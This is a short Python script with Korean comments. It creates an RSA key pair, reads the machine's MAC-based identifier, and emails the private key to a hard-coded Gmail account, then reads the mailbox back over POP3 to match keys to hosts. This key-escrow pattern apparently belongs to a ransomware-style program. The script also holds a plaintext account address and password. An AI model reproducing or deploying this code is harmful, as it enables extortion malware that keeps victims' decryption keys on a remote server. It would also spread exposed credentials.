from Crypto.PublicKey import RSA
from Crypto import Random  #RSA 키 생성시 필요
from Crypto.Cipher import PKCS1_OAEP #RSA 최신버전(보안더좋음)
#라이브러리(이메일전송라이브러리, 고유식별자 부여 라이브러리)
import smtplib
import uuid
import poplib
import email
from email.mime.text import MIMEText

if __name__ == "__main__":

    # RSA : 키, 싸이퍼 생성
    random_generator = Random.new().read
    rsa_key = RSA.generate(1024, random_generator)  # 키 정보 객체
    cipher = PKCS1_OAEP.new(rsa_key)
    private_key = rsa_key.export_key()
    print("비밀키는 : ", private_key)

    # 고유 식별자 번호
    UUID = uuid.getnode()
    print("UUID=",UUID)

    # smtp 로그인 후 비밀키 전송
    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.ehlo()  # say Hello
    smtp.starttls()  # TLS 사용시 필요
    smtp.login('secureantdd@gmail.com', 'antdd1234')  # 확인은 이 계정에서!

    msg = MIMEText(private_key.decode())  # 고유식별자번호 / RSA개인키 를 메세지로 전송함
    msg['Subject'] = str(UUID)
    msg['To'] = 'secureantdd@gmail.com'
    smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())

    smtp.quit()

    print("메일 읽기 시작")

    SERVER = "pop.gmail.com"
    server = poplib.POP3_SSL(SERVER)
    server.user('secureantdd@gmail.com')
    server.pass_('antdd1234')

    print(server.list())

    for i in range(len(server.list())):
        msg = server.retr(i + 1)[1]
        # text = b'\n'.join(msg).decode()  # 메일의 전체 내용을 읽어옴
        # idx = text.find('Subject:')
        # text = text[idx + 9:]
        # uuid = text[: text.find('\n')]  # 메일의 수신자(mac 주소) 를 가져온다
        # key = text[42:]  # 메일에 들어있는 해당 주소의 private key

        uuid = msg[12].decode()[msg[12].decode().find(':')+2:]
        key = b'\n'.join(msg[15:]).decode()
        print(uuid)
        print(key)
        #msg = b'\n'.join(msg).decode()
        #msg = email.message_from_string(msg)
        #print(msg)
        #uuid = msg['Subject']

        #print("분석한 메일=>", i+1, "번째 메일 ,",uuid,"에게 온 메일, key=",key)

        if uuid == str(UUID):  #  / 해당 호스트의 메일 찾음
            print(uuid, "호스트로 키 확인 들어갑니다\n key = ", key)